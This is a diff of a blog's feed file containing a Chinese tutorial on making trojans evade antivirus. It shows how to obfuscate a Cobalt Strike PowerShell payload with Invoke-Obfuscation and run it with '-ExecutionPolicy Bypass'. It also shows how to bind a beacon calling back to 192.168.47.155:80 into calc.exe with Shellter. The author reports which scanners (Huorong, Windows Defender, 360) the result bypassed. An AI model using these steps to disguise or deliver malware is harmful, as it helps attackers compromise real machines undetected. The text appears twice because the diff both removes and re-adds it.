-<h3 id="3-输入要加密的脚本路径"><a href="#3-输入要加密的脚本路径" class="headerlink" title="3.输入要加密的脚本路径"></a>3.输入要加密的脚本路径</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set scriptpath C:\Users\hacker\Desktop\payload.ps1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106220244166.png" alt="image-20230106220244166">	</p>
-<h3 id="4-加密脚本"><a href="#4-加密脚本" class="headerlink" title="4.加密脚本"></a>4.加密脚本</h3><p>此次我选择编码加密, 输入<code>encoding</code>, 随后出现8种编码加密方式, 这里我简单介绍下常用的五种加密</p>
-<ol>
-<li>ASCII编码</li>
-<li>HEX(16进制)编码</li>
-<li>octal(8进制)编码</li>
-<li>Binary(2进制)编码</li>
-<li>AES算法加密(最常用)</li>
-</ol>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106220433823.png" alt="image-20230106220433823">	</p>
-<p>此处我选择5, 即AES算法加密</p>
-<img src="木马免杀之工具篇/image-20230106221309176.png" alt="image-20230106221309176" style="zoom:67%;" />		
-
-
-
-<p>输入<code>back</code>返回上级目录, 然后输入<code>string</code>对脚本文件进行字符串混肴, 有三种字符串混肴方法, 此处我输入2选择了第二种</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106222848097.png" alt="image-20230106222848097">	</p>
-<h3 id="5-查看加密选项"><a href="#5-查看加密选项" class="headerlink" title="5.查看加密选项"></a>5.查看加密选项</h3><p>可以看到加密前和加密后的脚本内容对比, 以及采用了何种加密方法和完整的加密命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106223901101.png" alt="image-20230106223901101">	</p>
-<h3 id="6-输出脚本"><a href="#6-输出脚本" class="headerlink" title="6.输出脚本"></a>6.输出脚本</h3><p>输出加密后的脚本文件至工具目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out test.ps1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106221539461.png" alt="image-20230106221539461"></p>
-<h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><h3 id="火绒"><a href="#火绒" class="headerlink" title="火绒"></a>火绒</h3><p>使用火绒静态扫描脚本文件, 没有发现威胁</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106223945754.png" alt="image-20230106223945754">	</p>
-<p>cmd命令行输入如下命令执行脚本, 火绒没有报毒, 成功过掉火绒动态扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>至于为何要加上<code>-ExecutionPolicy Bypass</code>参数, 这是因为在默认情况下, powershell的安全策略规定不允许运行命令和文件, 但是可以通过添加此参数来绕过任意一个安全保护规则, 在真实的渗透环境中经常用到此参数来执行powershell脚本</p>
-</blockquote>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106224136701.png" alt="image-20230106224136701">	</p>
-<h3 id="WindowDefender"><a href="#WindowDefender" class="headerlink" title="WindowDefender"></a>WindowDefender</h3><p>成功过掉WindowDefender的静态扫描</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106224957853.png" alt="image-20230106224957853">	</p>
-<p>但是过不了WindowDefender的动态扫描</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106225055133.png" alt="image-20230106225055133">	</p>
-<h1 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>Shellter是一种动态二进制程序壳程序，它可以在现有的可执行文件中隐藏恶意软件。它使用动态链接库技术来实现恶意代码的注入，并且可以在不修改现有的可执行文件的情况下进行注入。这使得它非常难以检测，因为它不会改变文件的哈希值或数字签名</p>
-<p>Shellter的官方下载地址：<a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a></p>
-<p>当前Shellter最新免费版本是v7.2，最新收费版本是v_pro4.7</p>
-<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="1-选择模式"><a href="#1-选择模式" class="headerlink" title="1.选择模式"></a>1.选择模式</h3><p>点击shellter.exe运行工具进入命令行界面, 随后选择模式, 这里我输入A, 即选择自动模式</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126212152241.png" alt="image-20230126212152241">		</p>
-<h3 id="2-绑定32位PE文件"><a href="#2-绑定32位PE文件" class="headerlink" title="2.绑定32位PE文件"></a>2.绑定32位PE文件</h3><p>填写PE文件路径并要求此PE文件是32位的, 此处我以32位的calc.exe(计算器)为例, 先将calc.exe拖到Shellter文件目录, 然后填写PE文件路径, 随后会在Shellter_Backups目录备份原PE文件</p>
-<img src="木马免杀之工具篇/image-20230126213343207.png" alt="image-20230126213343207" style="zoom:67%;" />	
-
-<img src="木马免杀之工具篇/image-20230126213510379.png" alt="image-20230126213510379" style="zoom:67%;" />			
-
-
-
-<h3 id="3-是否开启隐身模式"><a href="#3-是否开启隐身模式" class="headerlink" title="3.是否开启隐身模式"></a>3.是否开启隐身模式</h3><p>询问是否启用隐身模式, 此处我选择了Yes</p>
-<blockquote>
-<p>启用隐身模式后, 执行生成的免杀木马不仅可以上线, 还能正常使用原PE文件的功能, 但缺点是免杀效果差</p>
-</blockquote>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126213740706.png" alt="image-20230126213740706">	</p>
-<h3 id="4-填写监听"><a href="#4-填写监听" class="headerlink" title="4.填写监听"></a>4.填写监听</h3><p>询问你是使用工具自带的payload还是自定义监听, 此处我输入L选择自带payload, 然后输入2选着HTTP监听</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214117290.png" alt="image-20230126214117290">	</p>
-<p>此处我使用CS来创建监听, 监听的地址和端口是<code>192.168.47.155:80</code>, 然后在Shellter命令行中填写</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214320371.png" alt="image-20230126214320371"></p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214440736.png" alt="image-20230126214440736">		</p>
-<h3 id="5-测试效果"><a href="#5-测试效果" class="headerlink" title="5.测试效果"></a>5.测试效果</h3><p>生成的免杀木马会覆盖原先PE文件, 执行效果如下图所示</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/%E5%8A%A8%E7%94%BB.gif" alt="动画">	</p>
-<h2 id="杀软测试-1"><a href="#杀软测试-1" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>将免杀木马发送到杀毒平台检测, 可以发现还是能绕过绝大多数杀软的, 像火绒,360杀毒这些主流杀软都能绕过, 但是这只仅仅是静态扫描, 动态扫描还是很难绕过</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126215153437.png" alt="image-20230126215153437">	</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>/2024/04/29/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
     <content><![CDATA[<h1 id="去除黑框"><a href="#去除黑框" class="headerlink" title="去除黑框"></a>去除黑框</h1><p>当我们运行Shellcode加载器时会出现如下图所示的黑框，可采用以下方法去除它</p>
 <img src="shellcode加载器/image-20230612171819718.png" alt="image-20230612171819718" style="zoom:50%;" />	
@@ -1680,6 +1574,112 @@
 
 
 
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2024/04/29/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
+    <content><![CDATA[<h1 id="Invoke-Obfuscation"><a href="#Invoke-Obfuscation" class="headerlink" title="Invoke-Obfuscation"></a>Invoke-Obfuscation</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Invoke-Obfuscation工具下载地址: <a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
+<p>这是一款针对<code>PowerShell</code>文件的免杀工具, 此处对CS生成的PowerShell木马进行免杀</p>
+<p>Invoke-Obfuscation是一款PowerShell混淆工具，可以将PowerShell脚本加密，使得它的检测和分析变得更加困难。该工具包含多种加密方法，可以单独使用也可以结合使用，以提高混淆的效果。Invoke-Obfuscation还有多个选项可以选择，如TOKEN、AST、STRING、ENCODING、COMPRESS和LAUNCHER，可以帮助你更好地混淆脚本</p>
+<h2 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h2><h3 id="1-CS生成ps木马"><a href="#1-CS生成ps木马" class="headerlink" title="1.CS生成ps木马"></a>1.CS生成ps木马</h3><p>打开Cobalt Strike, 点击<code>攻击&gt;生成后门-&gt;Payload Generator</code></p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106191819966.png" alt="image-20230106191819966">			</p>
+<p>选择相应的监听, 生成<code>powershell</code>木马</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106191957575.png" alt="image-20230106191957575">	</p>
+<h3 id="2-导入模块并加载"><a href="#2-导入模块并加载" class="headerlink" title="2.导入模块并加载"></a>2.导入模块并加载</h3><p>进入<code>invoke-Obsfuscation</code>文件夹并打开powershell, 执行如下命令导入<code>Invoke-Obfuscation</code>模块</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行如下命令加载模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106192850710.png" alt="image-20230106192850710"></p>
+<p>随后进入工具命令行界面, 如下图所示, 该工具支持六种加密方式:</p>
+<ul>
+<li><p>TOKEN: 将脚本转换为一个或多个PowerShell解析器令牌的序列</p>
+</li>
+<li><p>AST: 将脚本转换为抽象语法树</p>
+</li>
+<li><p>STRING: 混淆脚本中的字符串，使得脚本的意图变得模糊不清</p>
+</li>
+<li><p>ENCONDING: 将脚本转换为ASCII、Unicode或Base64编码</p>
+</li>
+<li><p>COMPRESS: 将脚本压缩，使得脚本的大小变小，从而使得脚本的传输和存储更加方便</p>
+</li>
+<li><p>LAUNCHER: 生成一个启动器，该启动器可以在目标系统上执行混淆后的脚本</p>
+</li>
+</ul>
+<img src="木马免杀之工具篇/image-20230106192908168.png" alt="image-20230106192908168" style="zoom:67%;" />	
+
+
+
+<h3 id="3-输入要加密的脚本路径"><a href="#3-输入要加密的脚本路径" class="headerlink" title="3.输入要加密的脚本路径"></a>3.输入要加密的脚本路径</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set scriptpath C:\Users\hacker\Desktop\payload.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106220244166.png" alt="image-20230106220244166">	</p>
+<h3 id="4-加密脚本"><a href="#4-加密脚本" class="headerlink" title="4.加密脚本"></a>4.加密脚本</h3><p>此次我选择编码加密, 输入<code>encoding</code>, 随后出现8种编码加密方式, 这里我简单介绍下常用的五种加密</p>
+<ol>
+<li>ASCII编码</li>
+<li>HEX(16进制)编码</li>
+<li>octal(8进制)编码</li>
+<li>Binary(2进制)编码</li>
+<li>AES算法加密(最常用)</li>
+</ol>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106220433823.png" alt="image-20230106220433823">	</p>
+<p>此处我选择5, 即AES算法加密</p>
+<img src="木马免杀之工具篇/image-20230106221309176.png" alt="image-20230106221309176" style="zoom:67%;" />		
+
+
+
+<p>输入<code>back</code>返回上级目录, 然后输入<code>string</code>对脚本文件进行字符串混肴, 有三种字符串混肴方法, 此处我输入2选择了第二种</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106222848097.png" alt="image-20230106222848097">	</p>
+<h3 id="5-查看加密选项"><a href="#5-查看加密选项" class="headerlink" title="5.查看加密选项"></a>5.查看加密选项</h3><p>可以看到加密前和加密后的脚本内容对比, 以及采用了何种加密方法和完整的加密命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106223901101.png" alt="image-20230106223901101">	</p>
+<h3 id="6-输出脚本"><a href="#6-输出脚本" class="headerlink" title="6.输出脚本"></a>6.输出脚本</h3><p>输出加密后的脚本文件至工具目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out test.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106221539461.png" alt="image-20230106221539461"></p>
+<h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><h3 id="火绒"><a href="#火绒" class="headerlink" title="火绒"></a>火绒</h3><p>使用火绒静态扫描脚本文件, 没有发现威胁</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106223945754.png" alt="image-20230106223945754">	</p>
+<p>cmd命令行输入如下命令执行脚本, 火绒没有报毒, 成功过掉火绒动态扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>至于为何要加上<code>-ExecutionPolicy Bypass</code>参数, 这是因为在默认情况下, powershell的安全策略规定不允许运行命令和文件, 但是可以通过添加此参数来绕过任意一个安全保护规则, 在真实的渗透环境中经常用到此参数来执行powershell脚本</p>
+</blockquote>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106224136701.png" alt="image-20230106224136701">	</p>
+<h3 id="WindowDefender"><a href="#WindowDefender" class="headerlink" title="WindowDefender"></a>WindowDefender</h3><p>成功过掉WindowDefender的静态扫描</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106224957853.png" alt="image-20230106224957853">	</p>
+<p>但是过不了WindowDefender的动态扫描</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106225055133.png" alt="image-20230106225055133">	</p>
+<h1 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>Shellter是一种动态二进制程序壳程序，它可以在现有的可执行文件中隐藏恶意软件。它使用动态链接库技术来实现恶意代码的注入，并且可以在不修改现有的可执行文件的情况下进行注入。这使得它非常难以检测，因为它不会改变文件的哈希值或数字签名</p>
+<p>Shellter的官方下载地址：<a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a></p>
+<p>当前Shellter最新免费版本是v7.2，最新收费版本是v_pro4.7</p>
+<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="1-选择模式"><a href="#1-选择模式" class="headerlink" title="1.选择模式"></a>1.选择模式</h3><p>点击shellter.exe运行工具进入命令行界面, 随后选择模式, 这里我输入A, 即选择自动模式</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126212152241.png" alt="image-20230126212152241">		</p>
+<h3 id="2-绑定32位PE文件"><a href="#2-绑定32位PE文件" class="headerlink" title="2.绑定32位PE文件"></a>2.绑定32位PE文件</h3><p>填写PE文件路径并要求此PE文件是32位的, 此处我以32位的calc.exe(计算器)为例, 先将calc.exe拖到Shellter文件目录, 然后填写PE文件路径, 随后会在Shellter_Backups目录备份原PE文件</p>
+<img src="木马免杀之工具篇/image-20230126213343207.png" alt="image-20230126213343207" style="zoom:67%;" />	
+
+<img src="木马免杀之工具篇/image-20230126213510379.png" alt="image-20230126213510379" style="zoom:67%;" />			
+
+
+
+<h3 id="3-是否开启隐身模式"><a href="#3-是否开启隐身模式" class="headerlink" title="3.是否开启隐身模式"></a>3.是否开启隐身模式</h3><p>询问是否启用隐身模式, 此处我选择了Yes</p>
+<blockquote>
+<p>启用隐身模式后, 执行生成的免杀木马不仅可以上线, 还能正常使用原PE文件的功能, 但缺点是免杀效果差</p>
+</blockquote>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126213740706.png" alt="image-20230126213740706">	</p>
+<h3 id="4-填写监听"><a href="#4-填写监听" class="headerlink" title="4.填写监听"></a>4.填写监听</h3><p>询问你是使用工具自带的payload还是自定义监听, 此处我输入L选择自带payload, 然后输入2选着HTTP监听</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214117290.png" alt="image-20230126214117290">	</p>
+<p>此处我使用CS来创建监听, 监听的地址和端口是<code>192.168.47.155:80</code>, 然后在Shellter命令行中填写</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214320371.png" alt="image-20230126214320371"></p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126214440736.png" alt="image-20230126214440736">		</p>
+<h3 id="5-测试效果"><a href="#5-测试效果" class="headerlink" title="5.测试效果"></a>5.测试效果</h3><p>生成的免杀木马会覆盖原先PE文件, 执行效果如下图所示</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/%E5%8A%A8%E7%94%BB.gif" alt="动画">	</p>
+<h2 id="杀软测试-1"><a href="#杀软测试-1" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>将免杀木马发送到杀毒平台检测, 可以发现还是能绕过绝大多数杀软的, 像火绒,360杀毒这些主流杀软都能绕过, 但是这只仅仅是静态扫描, 动态扫描还是很难绕过</p>
+<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230126215153437.png" alt="image-20230126215153437">	</p>
 ]]></content>
   </entry>
   <entry>
